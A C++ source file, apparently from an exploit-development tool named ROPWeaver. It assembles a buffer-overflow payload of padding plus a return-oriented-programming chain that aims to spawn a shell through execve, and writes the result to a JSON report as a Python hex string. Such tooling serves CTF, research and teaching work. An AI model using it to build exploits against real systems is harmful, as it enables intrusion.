#include "payload_gen.h"
#include <iostream>
#include <fstream>
#include <iomanip>
#include <sstream>
#include <stdexcept>
#include "nlohmann/json.hpp"
#include <ctime>

using json = nlohmann::json;

// ANSI escape codes for coloring
#define ANSI_COLOR_GREEN   "\x1b[32m"
#define ANSI_COLOR_ORANGE  "\033[33m"
#define ANSI_COLOR_RESET   "\x1b[0m"

// Utility function
std::vector<char> pack64(uint64_t n) {
    std::vector<char> result(8);
    for (int i = 0; i < 8; ++i) {
        result[i] = static_cast<char>((n >> (8 * i)) & 0xFF);
    }
    return result;
}

// Helper to convert the raw payload bytes to a Python hex string format
std::string to_python_hex(const std::vector<char>& payload) {
    std::stringstream ss;
    ss << std::hex << std::setfill('0');
    for (char byte : payload) {
        ss << "\\x" << std::setw(2) << static_cast<int>(static_cast<unsigned char>(byte));
    }
    return ss.str();
}

void PayloadGenerator::generate(const ROPChain& chain, size_t paddingSize, const std::string& filename) {
    // --- 1. Construct the Raw Payload ---
    std::vector<char> payload;
    payload.assign(paddingSize, 'A');
    std::vector<char> chain_bytes = chain.getPayloadBytes();
    payload.insert(payload.end(), chain_bytes.begin(), chain_bytes.end());

    // --- 2. Construct the Comprehensive JSON Report ---
    json report = json::object();
    std::time_t now = std::time(nullptr);

    try {
        // Basic Metadata
        report["report_id"] = "ROPW-" + std::to_string(now);
        
        // Convert std::put_time to string via stringstream before assigning
        std::stringstream ss;
        ss << std::put_time(std::gmtime(&now), "%Y-%m-%dT%H:%M:%SZ");
        report["report_date"] = ss.str();
        
        report["tool_version"] = "ROPWeaver_v1.2.3";
        report["target_binary"] = {
            {"filename", filename},
            // ...
        };
        
        // ROP Chain Details
        report["rop_chain_generation"] = {
            {"status", chain_bytes.empty() ? "Failure" : "Success (Execve-Shell)"}, 
            {"target_syscall", "execve"},
            {"chain_notes", "Attempted ROP chain generation."},
        };
        
        report["rop_chain_details"] = json::array(); 
        
        // Final Raw Payload Data
        report["raw_payload"] = {
            {"format", "python_hex_string"},
            {"data", to_python_hex(payload)},
            {"padding_size", paddingSize}
        };

    } catch (const std::exception& e) {
        std::cerr << "[x] JSON Report Generation Error: " << e.what() << std::endl;
        return; 
    }

    // --- 3. Write the JSON Report File ---
    const std::string REPORT_PATH = "reports/output.json";
    std::ofstream outfile(REPORT_PATH);

    if (outfile.is_open()) {
        outfile << report.dump(4);
        outfile.close();
        std::cout << ANSI_COLOR_GREEN << "[+] Comprehensive report written to: " 
                  << REPORT_PATH << ANSI_COLOR_RESET << std::endl;
    } else {
        std::cerr << ANSI_COLOR_RESET << "[x] FATAL ERROR: Could not open file for writing: " 
                  << REPORT_PATH << ".\n(Check 'reports/' folder permissions.)" << std::endl;
        return;
    }
}